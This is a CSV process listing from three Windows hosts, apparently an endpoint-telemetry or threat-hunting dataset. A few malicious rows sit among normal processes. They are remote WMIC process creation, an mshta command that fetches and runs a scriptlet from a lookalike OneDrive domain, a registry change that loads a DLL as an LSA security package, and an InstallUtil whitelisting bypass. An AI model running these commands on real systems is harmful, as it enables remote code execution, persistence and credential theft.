arguments,hostname,name,path,pid,username
"""C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe"" -ServerName:SkypeBackgroundHost",EC0003XSC,SkypeBackgroundHost.exe,C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c,5386,gracie.hug30
"""C:\Ruby24-x64\bin\ruby.exe"" ",EC0003XSC,ruby.exe,C:\Ruby24-x64\bin,5355,victoria.bell
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",EC0003XSC,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,5593,pheo.cam
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,EC0003XSC,svchost.exe,C:\Windows\system32,3312,NT AUTHORITY\SYSTEM
"""C:\Users\pheo.cam\AppData\Local\Programs\Python\Python37\python.exe"" ",EC0003XSC,python.exe,C:\Users\pheo.cam\AppData\Local\Programs\Python\Python37,2106,pheo.cam
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",EC0003XSC,tv_w32.exe,C:\Program Files (x86)\TeamViewer,6023,pheo.cam
"""LogonUI.exe"" /flags:0x0",EC0003XSC,LogonUI.exe,C:\Windows\system32,620,NT AUTHORITY\SYSTEM
C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},EC0003XSC,dllhost.exe,C:\Windows\system32,2508,NT AUTHORITY\SYSTEM
C:\Windows\System32\wbem\WMIC.exe /node:SS0004NDO process call create “cmd.exe /c whoami /force”,EC0003XSC,WMIC.exe,C:\Windows\System32\wbem\WMIC.exe,3552,a.adiaz
winlogon.exe,EC0003XSC,winlogon.exe,C:\Windows\system32,6156,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k utcsvc,EC0003XSC,svchost.exe,C:\Windows\System32,2320,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k NetworkService,EC0003XSC,svchost.exe,C:\Windows\System32,2220,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalService,EC0003XSC,svchost.exe,C:\Windows\system32,4520,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k netsvcs,EC0003XSC,svchost.exe,C:\Windows\system32,128,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k regsvc,EC0003XSC,svchost.exe,C:\Windows\system32,4036,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,EC0003XSC,spoolsv.exe,C:\Windows\System32,6056,NT AUTHORITY\SYSTEM
"""C:\Program Files\internet explorer\iexplore.exe"" ",EC0003XSC,iexplore.exe,C:\Program Files\internet explorer,1394,svc_kk
C:\Windows\System32\cmd.exe /C w32tm /tz,EC0003XSC,cmd.exe,C:\Windows\System32\cmd.exe,3760,ann.mar3
"""C:\Program Files (x86)\Common Files\VMware\USB\vmware-usbarbitrator64.exe""",EC0004NDO,vmware-usbarbitrator64.exe,C:\Program Files (x86)\Common Files\VMware\USB,4911,matthew.kell
"""C:\Users\annab.marti\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --type=gpu-process --no-sandbox --supports-dual-gpus=false --gpu-driver-bug-workarounds=9 12 13 23 27 29 49 70 84 --disable-gl-extensions=""GL_KHR_blend_equation_advanced GL_KHR_blend_equation_advanced_coherent"" --gpu-vendor-id=0x8086 --gpu-device-id=0x0a16 --gpu-driver-vendor=""Intel Corporation"" --gpu-driver-version=20.19.15.4331 --gpu-driver-date=11-18-2015 --service-request-channel-token=29571E74A71F5219E432184D13D76C95 --mojo-platform-channel-handle=1732 /prefetch:2",EC0004NDO,GitHubDesktop.exe,C:\Users\annab.marti\AppData\Local\GitHubDesktop\app-1.4.3,4335,annab.marti
"""taskhost.exe""",EC0004NDO,taskhost.exe,C:\Windows\system32,6148,NT AUTHORITY\SYSTEM
"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",EC0004NDO,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,2084,annieva82
C:\Windows\System32\svchost.exe -k utcsvc,EC0004NDO,svchost.exe,C:\Windows\System32,5052,NT AUTHORITY\SYSTEM
wininit.exe,EC0004NDO,wininit.exe,C:\Windows\system32,644,NT AUTHORITY\SYSTEM
"""C:\Windows\system32\Dwm.exe""",EC0004NDO,Dwm.exe,C:\Windows\system32,900,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ",EC0004NDO,soffice.exe,C:\Program Files (x86)\OpenOffice 4\program,5503,annieva82
C:\Windows\system32\lsm.exe,EC0004NDO,lsm.exe,C:\Windows\system32,5616,NT AUTHORITY\SYSTEM
"""C:\Users\loghernand\AppData\Local\slack\app-3.1.1\slack.exe""",EC0004NDO,slack.exe,C:\Users\loghernand\AppData\Local\slack\app-3.1.1,808,loghernand
"""C:\Users\loghernand\AppData\Local\slack\app-3.1.1\slack.exe"" --type=gpu-process --no-sandbox --supports-dual-gpus=false --gpu-driver-bug-workarounds=7 10 11 20 24 26 43 63 76 --disable-gl-extensions=""GL_KHR_blend_equation_advanced GL_KHR_blend_equation_advanced_coherent"" --gpu-vendor-id=0x8086 --gpu-device-id=0x0a16 --gpu-driver-vendor=""Intel Corporation"" --gpu-driver-version=20.19.15.4331 --gpu-driver-date=11-18-2015 --service-request-channel-token=801A57F64621336F74806802DB83B30B --mojo-platform-channel-handle=1628 /prefetch:2",EC0004NDO,slack.exe,C:\Users\loghernand\AppData\Local\slack\app-3.1.1,2386,loghernand
,EC0004NDO,AvastSvc.exe,,477,loghernand
"""C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe\Microsoft.Notes.exe"" -ServerName:App.AppX495fygk72hjw82j58ny5h3nr8hpsd8vs.mca",EC0004NDO,Microsoft.Notes.exe,C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_3.0.119.0_x64__8wekyb3d8bbwe,5727,annieva82
"C:\Users\loghernand\AppData\Local\slack\app-3.1.1\slack.exe --reporter-url=https://slack.com/apps/breakpad?instanceUid=c116fa6f-e78f-4f7e-9927-09567265c493&amp;version=3.1.1&amp;channel=prod --application-name=Slack ""--crashes-directory=C:\Users\loghernand\AppData\Local\Temp\Slack Crashes"" --v=1",EC0004NDO,slack.exe,C:\Users\loghernand\AppData\Local\slack\app-3.1.1,2140,loghernand
"""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"" --type=renderer --field-trial-handle=1556 1270622256617353588 15561965010207222735 131072 --service-pipe-token=1352282089870284743 --lang=en-US --enable-offline-auto-reload --enable-offline-auto-reload-visible-only --device-scale-factor=1 --num-raster-threads=3 --enable-main-frame-before-activation --service-request-channel-token=1352282089870284743 --renderer-client-id=45 --mojo-platform-channel-handle=7884 /prefetch:1",EC0004NDO,chrome.exe,C:\Program Files (x86)\Google\Chrome\Application,5225,loghernand
\SystemRoot\System32\smss.exe,EC0004NDO,smss.exe,\SystemRoot\System32,1716,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k netsvcs,EC0004NDO,svchost.exe,C:\Windows\system32,3496,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,EC0004NDO,svchost.exe,C:\Windows\System32,4108,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",EC0004NDO,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,3807,loghernand
%SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024 20480 768 Windows=On SubSystemType=Windows ServerDll=basesrv 1 ServerDll=winsrv:UserServerDllInitialization 3 ServerDll=winsrv:ConServerDllInitialization 2 ServerDll=sxssrv 4 ProfileControl=Off MaxRequestThreads=16,EC0004NDO,csrss.exe,C:\Windows\system32,2248,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k RPCSS,EC0004NDO,svchost.exe,C:\Windows\system32,3420,NT AUTHORITY\SYSTEM
C:\Windows\System32\spoolsv.exe,EC0004NDO,spoolsv.exe,C:\Windows\System32,5852,NT AUTHORITY\SYSTEM
C:\Windows\System32\msdtc.exe,EC0004NDO,msdtc.exe,C:\Windows\System32,4048,NT AUTHORITY\SYSTEM
"""LogonUI.exe"" /flags:0x0",EC0004NDO,LogonUI.exe,C:\Windows\system32,116,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,EC0004NDO,svchost.exe,C:\Windows\System32,4400,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,EC0004NDO,svchost.exe,C:\Windows\system32,3860,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k termsvcs,EC0004NDO,svchost.exe,C:\Windows\System32,2872,NT AUTHORITY\SYSTEM
"""C:\Users\annab.marti\AppData\Local\GitHubDesktop\app-1.4.3\GitHubDesktop.exe"" --squirrel-firstrun",EC0004NDO,GitHubDesktop.exe,C:\Users\annab.marti\AppData\Local\GitHubDesktop\app-1.4.3,5526,annab.marti
C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},EC0004NDO,dllhost.exe,C:\Windows\system32,5652,NT AUTHORITY\SYSTEM
"""C:\Users\loghernand\AppData\Local\slack\app-3.1.1\slack.exe"" --type=renderer --disable-pinch --no-sandbox --primordial-pipe-token=B3F36050C50A99BD488162270E67D4DD --lang=en-GB --standard-schemes=slack-resources slack-sounds slack-webapp-dev --app-user-model-id=com.squirrel.slack.slack --app-path=""C:\Users\loghernand\AppData\Local\slack\app-3.1.1\resources\app.asar"" --node-integration=true --webview-tag=false --no-sandbox --preload=""C:\Users\loghernand\AppData\Local\slack\app-3.1.1\resources\app.asar\src\static\index.js"" --device-scale-factor=1.5 --num-raster-threads=2 --enable-main-frame-before-activation --content-image-texture-target=0 0 3553;0 1 3553;0 2 3553;0 3 3553;0 4 3553;0 5 3553;0 6 3553;0 7 3553;0 8 3553;0 9 3553;0 10 3553;0 11 3553;0 12 3553;0 13 3553;0 14 3553;0 15 3553;0 16 3553;1 0 3553;1 1 3553;1 2 3553;1 3 3553;1 4 3553;1 5 3553;1 6 3553;1 7 3553;1 8 3553;1 9 3553;1 10 3553;1 11 3553;1 12 3553;1 13 3553;1 14 3553;1 15 3553;1 16 3553;2 0 3553;2 1 3553;2 2 3553;2 3 3553;2 4 3553;2 5 3553;2 6 3553;2 7 3553;2 8 3553;2 9 3553;2 10 3553;2 11 3553;2 12 3553;2 13 3553;2 14 3553;2 15 3553;2 16 3553;3 0 3553;3 1 3553;3 2 3553;3 3 3553;3 4 3553;3 5 3553;3 6 3553;3 7 3553;3 8 3553;3 9 3553;3 10 3553;3 11 3553;3 12 3553;3 13 3553;3 14 3553;3 15 3553;3 16 3553;4 0 3553;4 1 3553;4 2 3553;4 3 3553;4 4 3553;4 5 3553;4 6 3553;4 7 3553;4 8 3553;4 9 3553;4 10 3553;4 11 3553;4 12 3553;4 13 3553;4 14 3553;4 15 3553;4 16 3553 --service-request-channel-token=B3F36050C50A99BD488162270E67D4DD --renderer-client-id=8 --mojo-platform-channel-handle=2336 /prefetch:1",EC0004NDO,slack.exe,C:\Users\loghernand\AppData\Local\slack\app-3.1.1,3240,loghernand
C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,EC0004NDO,svchost.exe,C:\Windows\system32,3148,NT AUTHORITY\SYSTEM
"""C:\Program Files\internet explorer\iexplore.exe"" ",EC0004NDO,iexplore.exe,C:\Program Files\internet explorer,5235,lucywils17
C:\Windows\system32\dllhost.exe /Processid:{3EAE8C5E-B51F-4CBD-9DCE-FA6AA0BDF8B8},EC0004NDO,dllhost.exe,C:\Windows\system32,704,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",EC0004NDO,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,3055,loghernand
"\??\C:\Windows\system32\conhost.exe ""-29887463320281528418771495882049435123649789771-108284301750553232-1762948263",EC0004NDO,conhost.exe,C:\Windows\system32,1992,NT AUTHORITY\SYSTEM
C:\Windows\system32\services.exe,EC0004NDO,services.exe,C:\Windows\system32,6488,NT AUTHORITY\SYSTEM
winlogon.exe,EC0004NDO,winlogon.exe,C:\Windows\system32,1540,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ""-env:OOO_CWD=2C:\\Program Files (x86)\\OpenOffice 4""",EC0004NDO,soffice.bin,C:\Program Files (x86)\OpenOffice 4\program,2852,annieva82
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",EC0004NDO,AvastUI.exe,C:\Program Files\AVAST Software\Avast,6040,loghernand
C:\Windows\system32\lsass.exe,EC0004NDO,lsass.exe,C:\Windows\system32,1068,NT AUTHORITY\SYSTEM
"C:\Windows\System32\mshta vbscript:Close(Execute(""GetObject(""""script:http://www.Ónedrive.me/drprov.sct"""")""))",EC0004NDO,mshta.exe,C:\Windows\System32\mshta.exe,4348,lucywils17
"""C:\Users\annieva82\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",EC0004NDO,OneDrive.exe,C:\Users\annieva82\AppData\Local\Microsoft\OneDrive,1481,annieva82
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",EC0004NDO,tv_w32.exe,C:\Program Files (x86)\TeamViewer,3029,loghernand
C:\Windows\System32\svchost.exe -k NetworkService,EC0004NDO,svchost.exe,C:\Windows\System32,5768,NT AUTHORITY\SYSTEM
C:\Windows\System32\reg.exe ADD HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v Security Packages /t REG_expand_SZ /d C:\Windows\System32\schedtsk.dll,EC0004NDO,reg.exe,C:\Windows\System32\reg.exe,1244,loghernand
"""C:\Program Files (x86)\VMware\VMware Player\vmware-authd.exe""",EC0004NDO,vmware-authd.exe,C:\Program Files (x86)\VMware\VMware Player,893,matthew.kell
C:\Windows\system32\svchost.exe -k LocalService,EC0004NDO,svchost.exe,C:\Windows\system32,3340,NT AUTHORITY\SYSTEM
/logfile= /LogToConsole=false /U C:\Windows\Temp\setupapi.dll,EC0004NDO,InstallUtil,C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe,2972,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k DcomLaunch,EC0004NDO,svchost.exe,C:\Windows\system32,528,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k regsvc,EC0004NDO,svchost.exe,C:\Windows\system32,968,NT AUTHORITY\SYSTEM
"""C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c\SkypeBackgroundHost.exe"" -ServerName:SkypeBackgroundHost",EE0008QXW,SkypeBackgroundHost.exe,C:\Program Files\WindowsApps\Microsoft.SkypeApp_14.33.41.0_x64__kzf8qxf38zg5c,5068,a.adiaz
C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,EE0008QXW,svchost.exe,C:\Windows\system32,3372,NT AUTHORITY\SYSTEM
"""C:\Program Files\internet explorer\iexplore.exe"" ",EE0008QXW,iexplore.exe,C:\Program Files\internet explorer,3444,pheo.cam
C:\Windows\system32\svchost.exe -k appmodel,EE0008QXW,svchost.exe,C:\Windows\system32,356,NT AUTHORITY\SYSTEM
winlogon.exe,EE0008QXW,winlogon.exe,C:\Windows\system32,3140,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k smbsvcs,EE0008QXW,svchost.exe,C:\Windows\System32,2792,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\tv_w32.exe"" --action hooks  --log C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log  ",EE0008QXW,tv_w32.exe,C:\Program Files (x86)\TeamViewer,2572,svc_kk
C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,EE0008QXW,svchost.exe,C:\Windows\System32,2908,NT AUTHORITY\SYSTEM
"""C:\Users\pheo.cam\AppData\Local\GoToMeeting\9508\g2mcomm.exe"" ""Action=Host&amp;BrokerServiceSuffix=@ISL1&amp;Build=9508&amp;colClientUiReadyEvent=Global\55848945-2CEA-4978-BF24-0C6A3B11E66E&amp;Digest=1bc982ef0552b1fb859a423b1f290ef0&amp;Dir=C:\Users\pheo.cam\AppData\Local\GoToMeeting\9508\&amp;Download=Auto&amp;EGWAddress=216.115.208.230&amp;EGWDNS=egwglobal.gotomeeting.com&amp;EGWPort=80 443 8200&amp;LoaderPath=C:\Users\pheo.cam\AppData\Local\GoToMeeting\9508\g2mstart.exe&amp;LogName=c:\users\pheo.cam\appdata\local\temp\logmeinlogs\gotomeeting\9508\2018-10-29_12.04.18.379\GoToMeeting.log&amp;Mode=Normal&amp;Path=g2mlauncher.exe&amp;Plugin=G2MLauncher&amp;Product=g2m&amp;sessionTrackingId=e0-PH0LsK8MFgg2A9ZkKW16jt2JkQ4bP&amp;UniqueId=16cc""",EE0008QXW,g2mcomm.exe,C:\Users\pheo.cam\AppData\Local\GoToMeeting\9508,2185,pheo.cam
C:\Windows\System32\msdtc.exe,EE0008QXW,msdtc.exe,C:\Windows\System32,4036,NT AUTHORITY\SYSTEM
taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},EE0008QXW,taskhostw.exe,C:\Windows\System32,3800,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k utcsvc,EE0008QXW,svchost.exe,C:\Windows\System32,5180,NT AUTHORITY\SYSTEM
C:\Windows\system32\lsass.exe,EE0008QXW,lsass.exe,C:\Windows\system32,4868,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca",EE0008QXW,ShellExperienceHost.exe,C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy,2100,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer_Service.exe""",EE0008QXW,TeamViewer_Service.exe,C:\Program Files (x86)\TeamViewer,6030,svc_kk
C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235},EE0008QXW,dllhost.exe,C:\Windows\system32,4996,NT AUTHORITY\SYSTEM
sihost.exe,EE0008QXW,sihost.exe,C:\Windows\System32,3180,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k RPCSS,EE0008QXW,svchost.exe,C:\Windows\system32,4508,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalService,EE0008QXW,svchost.exe,C:\Windows\system32,3524,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ""-env:OOO_CWD=2C:\\Program Files (x86)\\OpenOffice 4""",EE0008QXW,soffice.bin,C:\Program Files (x86)\OpenOffice 4\program,5689,pheo.cam
C:\Windows\system32\svchost.exe -k NetworkService,EE0008QXW,svchost.exe,C:\Windows\system32,3168,NT AUTHORITY\SYSTEM
C:\Windows\Explorer.EXE,EE0008QXW,Explorer.EXE,C:\Windows,5400,NT AUTHORITY\SYSTEM
"""C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy\SearchUI.exe"" -ServerName:CortanaUI.AppXa50dqqa5gqv4a428c9y1jjw7m3btvepj.mca",EE0008QXW,SearchUI.exe,C:\Windows\SystemApps\Microsoft.Windows.Cortana_cw5n1h2txyewy,4928,NT AUTHORITY\SYSTEM
"""dwm.exe""",EE0008QXW,dwm.exe,C:\Windows\system32,6208,NT AUTHORITY\SYSTEM
"""C:\Users\pheo.cam\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",EE0008QXW,OneDrive.exe,C:\Users\pheo.cam\AppData\Local\Microsoft\OneDrive,4553,pheo.cam
C:\Windows\System32\svchost.exe -k netsvcs,EE0008QXW,svchost.exe,C:\Windows\System32,3408,NT AUTHORITY\SYSTEM
"C:\WINDOWS\system32\cmd.exe /c """"C:\Ruby24-x64\bin\irb.cmd"" """,EE0008QXW,cmd.exe,C:\WINDOWS\system32,1968,pheo.cam
"""C:\Ruby24-x64\bin\ruby.exe"" ",EE0008QXW,ruby.exe,C:\Ruby24-x64\bin,1452,pheo.cam
"""LogonUI.exe"" /flags:0x0 /state0:0xa3a5d855 /state1:0x41c64e6d",EE0008QXW,LogonUI.exe,C:\Windows\system32,6140,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted,EE0008QXW,svchost.exe,C:\Windows\system32,6376,NT AUTHORITY\SYSTEM
/loadhooks /Parent:0000000000001188,EE0008QXW,TabTip32.exe,C:\Program Files (x86)\Common Files\Microsoft Shared\Ink,4984,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k UnistackSvcGroup,EE0008QXW,svchost.exe,C:\Windows\system32,6036,NT AUTHORITY\SYSTEM
"""C:\Program Files (x86)\TeamViewer\TeamViewer.exe"" ",EE0008QXW,TeamViewer.exe,C:\Program Files (x86)\TeamViewer,6260,svc_kk
C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,EE0008QXW,svchost.exe,C:\Windows\system32,5784,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation,EE0008QXW,svchost.exe,C:\Windows\system32,2048,NT AUTHORITY\SYSTEM
C:\Windows\system32\svchost.exe -k DcomLaunch,EE0008QXW,svchost.exe,C:\Windows\system32,5080,NT AUTHORITY\SYSTEM
C:\Windows\system32\dllhost.exe /Processid:{A7CCA429-5F8F-4A5B-B524-82C38D561286},EE0008QXW,dllhost.exe,C:\Windows\system32,5780,NT AUTHORITY\SYSTEM
"""C:\Program Files\Windows Defender\\MpCmdRun.exe"" SpyNetServiceDss -RestrictPrivileges -AccessKey 5BDCBEBD-E077-6957-0484-82901932C7EC -Reinvoke",EE0008QXW,MpCmdRun.exe,C:\Program Files\Windows Defender,1388,NT AUTHORITY\SYSTEM
"""dwm.exe""",EE0008QXW,dwm.exe,C:\Windows\system32,4848,NT AUTHORITY\SYSTEM
winlogon.exe,EE0008QXW,winlogon.exe,C:\Windows\system32,6392,NT AUTHORITY\SYSTEM
C:\Windows\System32\wbem\WMIC.exe /node:EC0004NDO process call create “cmd.exe /c whoami /force”,EE0008QXW,WMIC.exe,C:\Windows\System32\wbem\WMIC.exe,5120,a.adiaz
C:\Windows\System32\svchost.exe -k termsvcs,EE0008QXW,svchost.exe,C:\Windows\System32,2740,NT AUTHORITY\SYSTEM
"""C:\Program Files\AVAST Software\Avast\AvastUI.exe"" /welcome",EE0008QXW,AvastUI.exe,C:\Program Files\AVAST Software\Avast,5291,jaco.pric
C:\Windows\System32\spoolsv.exe,EE0008QXW,spoolsv.exe,C:\Windows\System32,1696,NT AUTHORITY\SYSTEM
"""C:\Program Files\internet explorer\iexplore.exe"" ",EE0008QXW,iexplore.exe,C:\Program Files\internet explorer,2236,pheo.cam
\??\C:\Windows\system32\conhost.exe 0x4,EE0008QXW,conhost.exe,C:\Windows\system32,804,NT AUTHORITY\SYSTEM
,EE0008QXW,AvastSvc.exe,,2871,jaco.pric
"""C:\Program Files (x86)\OpenOffice 4\program\soffice.exe"" ",EE0008QXW,soffice.exe,C:\Program Files (x86)\OpenOffice 4\program,6147,pheo.cam
C:\Windows\System32\RuntimeBroker.exe -Embedding,EE0008QXW,RuntimeBroker.exe,C:\Windows\System32,5640,NT AUTHORITY\SYSTEM
C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,EE0008QXW,svchost.exe,C:\Windows\System32,332,NT AUTHORITY\SYSTEM
